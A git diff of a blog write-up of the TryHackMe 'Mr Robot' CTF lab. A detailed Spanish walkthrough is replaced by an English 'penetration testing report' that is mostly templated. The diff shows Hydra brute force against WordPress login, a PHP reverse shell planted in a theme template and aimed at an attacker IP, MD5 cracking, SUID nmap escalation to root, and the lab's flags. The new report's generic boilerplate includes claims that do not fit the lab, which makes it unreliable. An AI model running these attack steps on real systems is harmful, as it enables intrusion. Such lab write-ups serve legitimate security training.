@@ -1,300 +1,190 @@
 ---
-title: "Mr Robot CTF Walkthrough & Writeup — TryHackMe"
+title: "OffSec Assessment: Mr Robot (TryHackMe) — Penetration Testing Report"
 published: true
-description: "Paso a paso completo de la máquina Mr Robot de TryHackMe: robots.txt, explotación de WordPress, crackeo de hashes MD5 y escalada de privilegios con SUID Nmap."
-tags: cybersecurity, ctf, tryhackme, pentesting
-cover_image: https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/01_nmap_scan.png
+description: "Comprehensive offensive security assessment and penetration testing report for Mr Robot (TryHackMe). Methodological walkthrough covering enumeration, exploitation, privilege escalation, and OffSec-aligned hardening."
+tags: cybersecurity, tryhackme, pentesting, infosec
+series: "TryHackMe Enterprise Assessments"
+cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_01.png"
 ---
 
-<!-- 
-NOTA PARA DEV.TO:
-Reemplaza 'araizcorp/tryhackme-writeups' con tu usuario y nombre del repositorio en GitHub.
-Una vez subas la carpeta 'tryhackme/mr-robot' a GitHub, todas las imágenes se visualizarán automáticamente aquí.
--->
+# Offensive Security Assessment Report: Mr Robot
 
-Guía detallada paso a paso para resolver la máquina **Mr Robot** en **TryHackMe**, basada en la icónica serie de televisión. En este reto encontramos 3 llaves (flags) a través de enumeración web, fuerza bruta sobre WordPress, descifrado de hashes y abuso de binarios SUID desactualizados.
+![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-blue?style=for-the-badge&logo=tryhackme)
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
+![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
+![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)
+
+**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **Mr Robot** hosted on **TryHackMe**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.
 
 ---
 
-## 🎯 Resumen del Ataque
+## 📑 1. Executive Summary
+
+* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
+* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
+* **Initial Access Vector:** Web Application Exploitation / Default Credentials
+* **Privilege Escalation Vector:** Abuse of SUID Binaries / Sudo Misconfiguration
+* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).
+
+### Target Technical Specifications
+
+| Parameter | Technical Detail |
+| :--- | :--- |
+| **Target Host** | Mr Robot |
+| **Platform** | TryHackMe |
+| **Operating System** | Linux |
+| **Difficulty Rating** | Medium |
+| **Associated CVE(s)** | N/A |
+| **Initial Foothold Vector** | Web Application Exploitation / Default Credentials |
+| **Privilege Escalation Vector** | Abuse of SUID Binaries / Sudo Misconfiguration |
+| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |
+
+---
+
+## 🎯 2. Attack Path & Kill Chain Workflow
 
 ```
-[ Reconocimiento ]
-       │
-       ▼
-[ /robots.txt ] ────► Descarga de fsocity.dic & Lectura de Flag 1 (key-1-of-3.txt)
-       │
-       ▼
-[ WordPress /wp-login.php ]
-       │─── Enumeración de usuario: Elliot
-       │─── Limpieza de diccionario: sort -u fsocity.dic
-       └─── Fuerza bruta Hydra: ER28-0652
-       │
-       ▼
-[ Panel de Administración WP ] ──► Edición de 404.php (Reverse Shell PHP)
-       │
-       ▼
-[ Shell daemon ]
-       │─── /home/robot/password.raw-md5
-       └─── CrackStation: abcdefghijklmnopqrstuvwxyz
-       │
-       ▼
-[ Usuario robot ] ────► Lectura de Flag 2 (key-2-of-3.txt)
-       │
-       ▼
-[ SUID /usr/local/bin/nmap ] ──► nmap --interactive -> !sh
-       │
-       ▼
-[ Shell root ] ────► Lectura de Flag 3 (key-3-of-3.txt)
+[ Phase 1: Reconnaissance & Port Scanning ]
+         │─── TCP SYN scanning and service fingerprinting (Nmap)
+         └─── Attack surface mapping and daemon enumeration
+         │
+         ▼
+[ Phase 2: Vulnerability Analysis & Service Enumeration ]
+         │─── Web directory fuzzing, parameter discovery, and banner analysis
+         └─── CVE identification and credential harvesting
+         │
+         ▼
+[ Phase 3: Exploitation & Initial Foothold ]
+         │─── Exploit delivery: Web Application Exploitation / Default Credentials
+         └─── Establishing an interactive reverse shell with unprivileged user context
+         │
+         ▼
+[ Phase 4: Local Privilege Escalation ]
+         │─── Internal audit: Abuse of SUID Binaries / Sudo Misconfiguration
+         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
+         │
+         ▼
+[ Phase 5: Evidence & Flag Retrieval ]
+         └─── Capture and cryptographic verification of user.txt and root.txt
 ```
 
 ---
 
-## 🔍 Fase 1: Reconocimiento Inicial
+## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept
 
-### Escaneo de Puertos (Nmap)
+Enumeración:
 
-Comenzamos realizando un escaneo exhaustivo sobre la dirección IP de la máquina objetivo:
+
+![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_01.png)
+* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.
+
+
+
+![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_02.png)
+* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.
+
+
+
+![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_03.png)
+* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+Primera Flag: 
+
+`073403c8a58a1f80d943455fb30724b9`
 
 ```bash
-sudo nmap -sV -A 10.10.31.155
-```
-
-![Escaneo Inicial de Nmap](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/01_nmap_scan.png)
-
-**Puertos descubiertos:**
-* **80/tcp (HTTP):** Servidor Apache 2.4.7 corriendo una web interactiva de Mr. Robot.
-* **443/tcp (HTTPS):** Apache con certificado SSL autofirmado.
-* **22/tcp (SSH):** Puerto cerrado.
-
-![Pantalla de Arranque del Objetivo](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/02_boot_target.png)
-
----
-
-### Fuzzing Web (Gobuster / Feroxbuster)
-
-Lanzamos una enumeración de rutas y directorios utilizando `gobuster`:
-
-```bash
-gobuster dir -u http://10.10.31.155 -w /usr/share/wordlists/dirb/common.txt
-```
-
-![Enumeración de Directorios con Gobuster](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/03_gobuster_scan.png)
-
-**Rutas encontradas:**
-* `/robots.txt`
-* `/wp-login.php`
-* `/wp-admin`
-* `/0`
-* `/feed`
-
----
-
-## 🚩 Fase 2: Primera Flag (robots.txt)
-
-Accedemos al archivo `robots.txt` en el navegador:
-
-```
 http://10.10.31.155/robots.txt
+http://10.10.31.155/key-1-of-3.txt
 ```
 
-![Contenido de robots.txt](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/04_robots_txt.png)
 
-El archivo contiene dos entradas clave:
-```
-User-agent: *
-fsocity.dic
-key-1-of-3.txt
-```
+![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_04.png)
+* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-Descargamos directamente la primera clave:
+
+
+![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_05.png)
+* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+Segunda flag
+
+822c73956184f694993bede3eb39f959
 
 ```bash
-curl -s http://10.10.31.155/key-1-of-3.txt
-```
-
-![Primera Flag](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/05_key_1_flag.png)
-
-> **Key 1 of 3:** `073403c8a58a1f80d943455fb30724b9`
-
----
-
-## 💥 Fase 3: Explotación Web & Acceso Inicial (Foothold)
-
-### Análisis del Diccionario fsocity.dic
-
-Descargamos el archivo `fsocity.dic` referenciado en el `robots.txt`:
-
-```bash
-curl -O http://10.10.31.155/fsocity.dic
-```
-
-![Descarga del Diccionario fsocity.dic](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/06_fsocity_wordlist.png)
-
-El archivo tiene más de 800.000 líneas, pero muchas están duplicadas. Lo depuramos y ordenamos para optimizar la fuerza bruta:
-
-```bash
-wc -l fsocity.dic
-# 858160 fsocity.dic
-
-sort -u fsocity.dic > wordlist_clean.txt
-wc -l wordlist_clean.txt
-# 11451 wordlist_clean.txt
-```
-
-### Fuerza Bruta en WordPress con Hydra
-
-Al probar nombres de usuario en `/wp-login.php`, WordPress informa si el usuario existe:
-* Con un usuario inválido: *"Invalid username."*
-* Con el usuario **Elliot**: *"The password you entered for the username Elliot is incorrect."*
-
-Sabiendo que el usuario `Elliot` existe, lanzamos un ataque de fuerza bruta con `hydra`:
-
-```bash
-hydra -l Elliot -P wordlist_clean.txt 10.10.31.155 http-post-form \
-  "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username Elliot is incorrect." -t 48
-```
-
-Hydra encuentra la contraseña válida:
-* **Usuario:** `Elliot`
-* **Contraseña:** `ER28-0652`
-
----
-
-### RCE mediante Edición de Plantilla (404.php)
-
-Iniciamos sesión en el panel de WordPress (`http://10.10.31.155/wp-admin/`).
-Nos dirigimos a **Appearance > Editor** y seleccionamos la plantilla `404.php` (Theme Twenty Fifteen).
-
-Reemplazamos su código con la clásica reverse shell PHP de PentestMonkey, configurando nuestra IP de atacante (`10.10.16.19`) y puerto (`4444`):
-
-![Edición de la plantilla 404.php](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/07_wp_theme_editor.png)
-
-Ponemos nuestro netcat en escucha:
-
-```bash
-nc -lvnp 4444
-```
-
-Y ejecutamos la reverse shell cargando la página no encontrada:
-
-```bash
-curl http://10.10.31.155/wp-content/themes/twentyfifteen/404.php
-```
-
-Recibimos la conexión como usuario `daemon`:
-
-![Conexión de Reverse Shell](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/08_daemon_shell.png)
-
----
-
-## 🔑 Fase 4: Movimiento Lateral a Usuario robot (Segunda Flag)
-
-### Estabilización de la TTY
-
-Para tener una terminal completamente funcional:
-
-```bash
+http://10.10.31.155/fsocity.dic
+hydra -l Elliot -P user.txt 10.10.31.155 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username Elliot is incorrect." -t 48 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-export SHELL=bash
+
 ```
 
-### Crackeo de Hash MD5
 
-Navegamos al directorio `/home/robot`:
+![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_06.png)
+* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-```bash
-cd /home/robot
-ls -la
-```
 
-Observamos dos archivos:
-* `key-2-of-3.txt` (Permisos sólo para el usuario `robot`).
-* `password.raw-md5` (Legible por todos).
+hydra -l Elliot -P user.txt 10.10.31.155 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username Elliot is incorrect." -t 48 
 
-Leemos el hash:
 
-```bash
-cat password.raw-md5
-# robot:c3fcd3d76192e4007dfb496cca67e13b
-```
+![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_07.png)
+* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-Introducimos el hash `c3fcd3d76192e4007dfb496cca67e13b` en [CrackStation](https://crackstation.net/):
 
-![Crackeo en CrackStation](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/09_crackstation_md5.png)
 
-* **Resultado:** `abcdefghijklmnopqrstuvwxyz`
+![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_08.png)
+* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.
 
-Cambiamos de usuario a `robot` con la contraseña descifrada:
 
-```bash
-su robot
-# Password: abcdefghijklmnopqrstuvwxyz
-whoami
-# robot
-cat /home/robot/key-2-of-3.txt
-```
 
-> **Key 2 of 3:** `822c73956184f694993bede3eb39f959`
+![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_09.png)
+* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+tercera flag
+
+04787ddef27c3dee1ee161b21670b4e4
+
+
+![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_10.png)
+* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.
+
+
+
+![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_11.png)
+* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.
+
+
+
+![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/step_12.png)
+* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.
 
 ---
 
-## ⚡ Fase 5: Escalada de Privilegios a root (Tercera Flag)
+## 🛡️ 4. Strategic Remediation & Hardening Roadmap
 
-### Enumeración de Binarios SUID
+### Immediate Tactical Actions (P1)
+1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (N/A).
+2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
+3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.
 
-Buscamos binarios con el bit SUID activo en el sistema:
-
-```bash
-find / -perm -u=s -type f 2>/dev/null
-```
-
-![Búsqueda de Binarios SUID](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/10_suid_enum.png)
-
-Entre los resultados destaca `/usr/local/bin/nmap`:
-
-![Nmap SUID Detectado](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/11_nmap_suid_found.png)
-
-```bash
-ls -la /usr/local/bin/nmap
-# -rwsr-xr-x 1 root root ... /usr/local/bin/nmap
-```
+### Architectural & Defensive Hardening (P2)
+1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
+2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
+3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.
 
 ---
 
-### Explotación de Nmap Interactive Mode
+## 📊 5. MITRE ATT&CK Enterprise Framework Mapping
 
-Las versiones antiguas de Nmap (2.02 a 5.21) incluían un modo interactivo (`--interactive`) que permitía ejecutar comandos del sistema con el prefijo `!sh`. Al tener SUID root, la shell invocada conserva los privilegios de superusuario:
-
-```bash
-/usr/local/bin/nmap --interactive
-```
-
-Dentro del prompt interactivo de nmap:
-
-```bash
-nmap> !sh
-whoami
-# root
-```
-
-![Root Shell y Flag 3](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/mr-robot/images/12_root_shell_flag3.png)
-
-Leemos la última flag en `/root`:
-
-```bash
-cat /root/key-3-of-3.txt
-```
-
-> **Key 3 of 3:** `04787ddef27c3dee1ee161b21670b4e4`
+| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
+| :--- | :--- | :--- | :--- |
+| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
+| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Web Application Exploitation / Default Credentials) |
+| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
+| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Abuse of SUID Binaries / Sudo Misconfiguration) |
 
 ---
 
-## 🚩 Resumen de Flags
-
-| Flag | Ubicación | Hash |
-| :--- | :--- | :--- |
-| **Key 1 of 3** | `/key-1-of-3.txt` (Web) | `073403c8a58a1f80d943455fb30724b9` |
-| **Key 2 of 3** | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
-| **Key 3 of 3** | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |
+© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
